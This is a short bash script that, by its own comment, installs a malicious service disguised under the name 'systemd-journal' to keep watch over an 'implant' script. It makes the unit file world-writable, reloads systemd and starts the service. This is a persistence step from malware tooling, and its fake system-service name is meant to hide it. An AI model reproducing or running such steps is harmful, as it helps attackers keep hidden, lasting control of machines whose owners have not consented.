#!/bin/bash
#
# Creates a malicious service named systemd-journal
# that is monitoring the base implant script.
#

sudo chmod 777 /etc/systemd/system/systemd-journal.service
sudo systemctl daemon-reload
sudo systemctl start systemd-journal
